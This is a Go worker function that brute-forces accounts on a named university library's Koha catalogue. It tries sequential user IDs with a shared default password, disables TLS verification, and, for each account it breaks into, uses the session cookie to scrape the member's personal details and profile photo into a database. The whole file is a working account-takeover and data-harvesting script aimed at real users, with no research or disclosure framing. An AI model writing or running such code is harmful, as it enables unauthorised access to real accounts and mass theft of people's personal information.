package worker

import (
	"crypto/tls"
	"io"
	"log"
	"nalanda/db"
	imagehandler "nalanda/imageHandler"
	"nalanda/parser"
	"net/http"
	"net/url"
	"strconv"
	"strings"
)

func Bot(id int, jobs <-chan int, results chan<- int) {
	for enum := range jobs {
		log.Println("worker ", id, " started enum ", enum)

		params := url.Values{}
		params.Add("userid", strconv.Itoa(enum))
		params.Add("password", `thapar@123`)
		body := strings.NewReader(params.Encode())

		req, err := http.NewRequest("POST", "https://library.thapar.edu/cgi-bin/koha/opac-user.pl", body)
		if err != nil {
			log.Println(err)
		}

		http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			log.Println(err)
		}
		defer resp.Body.Close()
		bodyBytes, err := io.ReadAll(resp.Body)
		if err != nil {
			log.Println(err)
		}
		bodyString := string(bodyBytes)

		db.UpdatePermutation(1, enum)

		if bodyString[45] == 76 { // 76 value of this string should be 76 (ascii) . Saves the time complexitfy of doing a string search or regex
			//proceed to get pi
			cookie := resp.Cookies()[0].Value
			req, err := http.NewRequest("GET", "https://library.thapar.edu/cgi-bin/koha/opac-memberentry.pl", nil)
			if err != nil {
				log.Println(err)
			}
			req.Header.Set("Cookie", "CGISESSID="+cookie)
			resp, err := http.DefaultClient.Do(req)
			if err != nil {
				log.Println(err)
			}
			defer resp.Body.Close()
			s, a, c, r := parser.Parser(resp, enum)
			r.Profile = imagehandler.ConvImage(cookie, enum)
			db.CreateRecord(s, a, c, r)
		}
	}
}
